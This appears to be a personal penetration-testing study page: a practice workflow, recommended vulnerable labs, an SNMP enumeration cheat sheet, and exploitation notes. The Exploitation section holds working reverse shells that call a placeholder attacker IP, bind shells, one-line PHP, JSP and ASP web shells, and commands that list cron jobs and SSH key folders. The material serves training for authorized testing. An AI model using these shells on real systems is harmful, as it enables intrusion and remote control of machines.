---
date: 2025-11-03
layout: single
hidemeta: true
---

# Meta-Process

| **Step** | **Task**                                                                                                                                                                                                                                                                                                                                                                 |
| -------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| 1.       | Get the user flag on your own                                                                                                                                                                                                                                                                                                                                            |
| 2.       | Get the root flag on your own                                                                                                                                                                                                                                                                                                                                            |
| 3.       | Write your **technical** documentation                                                                                                                                                                                                                                                                                                                                   |
| 4.       | Write your **non-technical** documentation                                                                                                                                                                                                                                                                                                                               |
| 5.       | Compare your notes with the official write-up                                                                                                                                                                                                                                                                                                                            |
| 6.       | Create a list of information you have missed                                                                                                                                                                                                                                                                                                                             |
| 7.       | Watch video or read blog walkthrough and compare it with your notes<br>- https://www.youtube.com/@ippsec/videos<br>- https://ippsec.rocks/?# <br>- https://www.youtube.com/@vbscrub/videos <br> - https://www.youtube.com/watch?v=CU9Iafc-Igs&list=PLF7JR1a3dLONdkRYU_8-5OcgOzrWe2549 <br> - https://www.youtube.com/@LiveOverflow/videos <br> - https://0xdf.gitlab.io/ |
| 8.       | Expand your notes and documentation by adding the missed parts                                                                                                                                                                                                                                                                                                           |

- PowerShell: https://underthewire.tech/wargames
- Linux Terminal: https://overthewire.org/wargames/

---

- Tmux:
    - https://tmuxcheatsheet.com/
    - https://www.youtube.com/watch?v=Lqehvpe_djs
- Vim:
    - https://vimsheet.com/

---

# Recommended Retired Boxes

- Granny/Grandpa
- Jerry
- Blue
- Lame
- Optimum
- Legacy
- Devel

| Box                                                                                           |                                                                                                                                                                                                                                |
| --------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)                                 | Is a modern vulnerable web application written in Node.js, Express, and Angular which showcases the entire [OWASP Top Ten](https://owasp.org/www-project-top-ten) along with many other real-world application security flaws. |
| [Metasploitable 2](https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/) | Is a purposefully vulnerable Ubuntu Linux VM that can be used to practice enumeration, automated, and manual exploitation.                                                                                                     |
| [Metasploitable 3](https://github.com/rapid7/metasploitable3)                                 | Is a template for building a vulnerable Windows VM configured with a wide range of [vulnerabilities](https://github.com/rapid7/metasploitable3/wiki/Vulnerabilities).                                                          |
| [DVWA](https://github.com/digininja/DVWA)                                                     | This is a vulnerable PHP/MySQL web application showcasing many common web application vulnerabilities with varying degrees of difficulty.                                                                                      |

---
# Pre-Engagement

## 3rd Parties (Infrastructure)

- AWS: https://aws.amazon.com/es/security/penetration-testing/

## Sensitive Data Regulations

- UK: https://www.gov.uk/data-protection
- US:
    - General: https://www.ftc.gov/business-guidance/privacy-security
    - Financial: https://www.ftc.gov/business-guidance/privacy-security/gramm-leach-bliley-act
    - Health: https://www.hhs.gov/hipaa/index.html

# Information Gathering

- Ports:
    - https://www.stationx.net/common-ports-cheat-sheet/
    - https://web.archive.org/web/20240315102711/https://packetlife.net/media/library/23/common-ports.pdf
    - https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/
- OWASP Top 10:
    - https://owasp.org/www-project-top-ten/
- HTTP Codes:
    - https://en.wikipedia.org/wiki/List_of_HTTP_status_codes#Standard_codes
- Web Page Scanner:
    - https://github.com/RedSiege/EyeWitness

# Vulnerability Assessment

```bash
#####################################################################
#                   SNMP ENUMERATION CHEATSHEET                     #
#####################################################################

#====================================================================
# 1. CORE CONCEPTS & VULNERABILITY
#====================================================================

# - SNMPv1/v2c use a plaintext **Community String** for access.
# - Default Strings: **`public`** (Read-Only) and **`private`** (Read/Write) are common.
# - Goal: Find a valid community string to read the **MIB (Management Information Base)**,
#   which contains sensitive system, network, and process information.
# - Security Fix: SNMPv3 uses modern authentication and encryption.

#====================================================================
# 2. COMMANDS
#====================================================================

| Tool | Command / Syntax | Purpose |
| :--- | :--- | :--- |
| **`onesixtyone`** | `onesixtyone -c <wordlist> <TARGET_IP>` | **Discover** community strings by brute-forcing from a wordlist. This is your first step. |
| **`snmpwalk`** | `snmpwalk -v 2c -c <COMMUNITY_STRING> <TARGET_IP> [OID]` | **Extract data** from the device's MIB tree once you have a valid community string. |

https://github.com/trailofbits/onesixtyone

#====================================================================
# 3. COMMON OIDs (Object Identifiers) for `snmpwalk`
#====================================================================
# Use these OIDs with snmpwalk to quickly pull valuable information.

| OID | Information Revealed |
| :--- | :--- |
| **`.1.3.6.1.2.1.1.1.0`** | System Description (OS, version). |
| **`.1.3.6.1.2.1.1.5.0`** | System Name (Hostname). |
| **`.1.3.6.1.2.1.25.1.1.0`** | System Uptime. |
| **`.1.3.6.1.2.1.25.4.2.1.2`**| **(CRITICAL)** List of all running processes. Check for passwords in arguments. |
| **`.1.3.6.1.2.1.4.20`** | IP Address and Routing Table information. |
```

# Exploitation

- Exploit DBs
    - https://www.exploit-db.com/
    - https://www.rapid7.com/db/
    - https://www.vulnerability-lab.com/

## Reverse Shells

- https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/
- https://highon.coffee/blog/reverse-shell-cheat-sheet/
- URL ENCODE: https://www.urlencoder.org/

```bash
nc -lvnp <CALLBACK_PORT>
```

```bash
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<CALLBACK_PORT> 0>&1'

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> <CALLBACK_PORT> >/tmp/f
```

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',<CALLBACK_PORT>);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

## Bind Shells

- https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp <LISTEN_PORT> >/tmp/f
```

```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",<LISTEN_PORT>));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]<LISTEN_PORT>; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

```bash
nc -lvnp <LISTEN_PORT>
```

```shell
for i in python3 python python2; do command -v "$i" >/dev/null && "$i" -c 'import pty; pty.spawn("/bin/bash")' && exit; done

export TERM=xterm-256color

CTRL+Z
stty raw -echo ; fg
```

## Web Shells

|Web Server|Default Webroot|
|---|---|
|`Apache`|/var/www/html/|
|`Nginx`|/usr/local/nginx/html/|
|`IIS`|c:\inetpub\wwwroot\|
|`XAMPP`|C:\xampp\htdocs\|

```php
<?php system($_REQUEST["cmd"]); ?>
```

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

```asp
<% eval request("cmd") %>
```

---

# Post-Exploitation

## Privilege Escalation (PrivEsc)

**NOTE:** scripts are noisy for any sort of monitoring software, so manual checks may be preferred

### Linux

- https://github.com/peass-ng/PEASS-ng/blob/master/linPEAS/README.md
- https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
- https://gtfobins.github.io/

```bash
dpkg -l

sudo -l

cat /etc/crontab /var/spool/cron/crontabs/root
ls -la /etc/cron.d/

ls -la /home/*/.ssh/
ls -la /root/.ssh/
```

### Windows

- https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
- https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
- https://github.com/GhostPack/Seatbelt
- https://lolbas-project.github.io/#

```bash
for %f in ("C:\Program Files", "C:\Program Files (x86)") do @(echo. && echo --- Listing: %~f --- && dir "%~f" /b)
```

# Lateral Movement

# Proof-of-Concept

# Post-Engagement
